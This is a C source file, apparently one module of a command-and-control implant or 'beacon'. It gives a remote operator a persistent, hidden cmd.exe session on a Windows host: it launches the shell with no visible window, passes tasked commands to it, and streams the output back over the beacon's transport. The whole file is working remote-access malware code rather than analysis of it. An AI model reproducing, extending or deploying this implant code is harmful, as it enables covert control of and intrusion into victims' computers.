// Interactive shell: persistent cmd.exe session across tasks.
// OP_ISHELL payload:
//   empty (0 bytes) → stop session (if running)
//   non-empty       → start if not running, write to stdin, drain stdout real-time
//
// ishell_pump() is called from the main loop every iteration to flush output
// from long-running commands without blocking task dispatch.

#include "../core/beacon.h"

static HANDLE   g_proc    = NULL;
static HANDLE   g_stdin   = NULL;   // write end → child stdin
static HANDLE   g_stdout  = NULL;   // read end  ← child stdout/stderr
static uint64_t g_task_id = 0;      // task_id for streaming output back

static void ishell_stop(void) {
    if (g_proc) { TerminateProcess(g_proc, 0); CloseHandle(g_proc); g_proc = NULL; }
    if (g_stdin)  { CloseHandle(g_stdin);  g_stdin  = NULL; }
    if (g_stdout) { CloseHandle(g_stdout); g_stdout = NULL; }
}

static int ishell_alive(void) {
    if (!g_proc) return 0;
    DWORD code = 0;
    if (GetExitCodeProcess(g_proc, &code) && code != STILL_ACTIVE) {
        CloseHandle(g_proc);   g_proc   = NULL;
        CloseHandle(g_stdin);  g_stdin  = NULL;
        CloseHandle(g_stdout); g_stdout = NULL;
        return 0;
    }
    return 1;
}

static int ishell_start(void) {
    HANDLE child_in_r = NULL, child_in_w = NULL;
    HANDLE child_out_r = NULL, child_out_w = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

    if (!CreatePipe(&child_in_r,  &child_in_w,  &sa, 0)) return 0;
    if (!CreatePipe(&child_out_r, &child_out_w, &sa, 0)) {
        CloseHandle(child_in_r); CloseHandle(child_in_w); return 0;
    }
    // Make our handles non-inheritable.
    SetHandleInformation(child_in_w,  HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(child_out_r, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    rt_memset(&si, 0, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = child_in_r;
    si.hStdOutput  = child_out_w;
    si.hStdError   = child_out_w;

    PROCESS_INFORMATION pi;
    rt_memset(&pi, 0, sizeof(pi));
    char cmd[] = "cmd.exe";
    BOOL ok = CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(child_in_r);
    CloseHandle(child_out_w);
    if (!ok) {
        CloseHandle(child_in_w);
        CloseHandle(child_out_r);
        return 0;
    }
    CloseHandle(pi.hThread);
    g_proc   = pi.hProcess;
    g_stdin  = child_in_w;
    g_stdout = child_out_r;
    return 1;
}

// Read available pipe data, convert OEM→UTF-8, write to output queue.
// Returns 1 if any data was read, 0 otherwise.
static int ishell_read_pipe(void) {
    DWORD avail = 0;
    if (!PeekNamedPipe(g_stdout, NULL, 0, NULL, &avail, NULL) || !avail)
        return 0;

    int got = 0;
    uint8_t raw[8192];
    while (avail > 0) {
        DWORD rd = avail < sizeof(raw) ? avail : (DWORD)sizeof(raw);
        if (!ReadFile(g_stdout, raw, rd, &rd, NULL) || !rd) break;
        got = 1;

        // OEM → UTF-8
        int wn = MultiByteToWideChar(CP_OEMCP, 0, (LPCCH)raw, (int)rd, NULL, 0);
        if (wn <= 0) { out_write(raw, rd); goto next; }
        WCHAR* wb = (WCHAR*)bmalloc((wn + 1) * sizeof(WCHAR));
        if (!wb) { out_write(raw, rd); goto next; }
        MultiByteToWideChar(CP_OEMCP, 0, (LPCCH)raw, (int)rd, wb, wn);
        int un = WideCharToMultiByte(CP_UTF8, 0, wb, wn, NULL, 0, NULL, NULL);
        if (un > 0) {
            uint8_t* ub = (uint8_t*)bmalloc((size_t)un);
            if (ub) {
                WideCharToMultiByte(CP_UTF8, 0, wb, wn, (LPSTR)ub, un, NULL, NULL);
                out_write(ub, (size_t)un);
                bfree(ub);
            } else {
                out_write(raw, rd);
            }
        }
        bfree(wb);

    next:
        // Flush before the output buffer overflows.
        if (out_remaining() < sizeof(raw))
            out_flush_chunk(get_transport(), 0);

        // Check if more data is available right now.
        avail = 0;
        if (!PeekNamedPipe(g_stdout, NULL, 0, NULL, &avail, NULL))
            break;
    }
    return got;
}

// Drain available output for up to timeout_ms.
// first_ms — max wait for the first byte; idle_ms — if data came, wait this
//            long for more before returning.
static void ishell_drain(DWORD first_ms, DWORD idle_ms) {
    DWORD deadline = GetTickCount() + first_ms;
    int got_any = 0;
    for (;;) {
        if (ishell_read_pipe()) {
            out_flush_chunk(get_transport(), 0);
            got_any = 1;
            deadline = GetTickCount() + idle_ms;
            continue;
        }
        if (GetTickCount() >= deadline) break;
        Sleep(20);
    }
}

// Called from the main loop EVERY iteration to flush pending output
// from long-running commands. Returns quickly if nothing to read.
void ishell_pump(void) {
    if (!ishell_alive()) return;
    if (!g_stdout) return;

    DWORD avail = 0;
    if (!PeekNamedPipe(g_stdout, NULL, 0, NULL, &avail, NULL) || !avail)
        return;

    // Data available — start a new output frame with the saved task_id.
    out_begin(g_task_id, RESP_OUTPUT);
    ishell_read_pipe();
    out_flush_chunk(get_transport(), 0);
}

void cmd_ishell(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);
    g_task_id = t->id;   // save for ishell_pump()

    // Empty payload = stop.
    if (!t->pay || t->pay_len == 0) {
        ishell_stop();
        const char msg[] = "interactive shell closed\n";
        out_write(msg, sizeof(msg) - 1);
        return;
    }

    // Start if not running.
    if (!ishell_alive()) {
        if (!ishell_start()) {
            const char err[] = "failed to start cmd.exe\n";
            out_write(err, sizeof(err) - 1);
            return;
        }
        // Drain the initial banner (prompt).
        ishell_drain(1500, 100);
    }

    // Write input line + newline to stdin.
    DWORD wr = 0;
    WriteFile(g_stdin, t->pay, (DWORD)t->pay_len, &wr, NULL);
    const char nl[] = "\r\n";
    WriteFile(g_stdin, nl, 2, &wr, NULL);

    // Drain output produced by this command.
    ishell_drain(5000, 20);
}
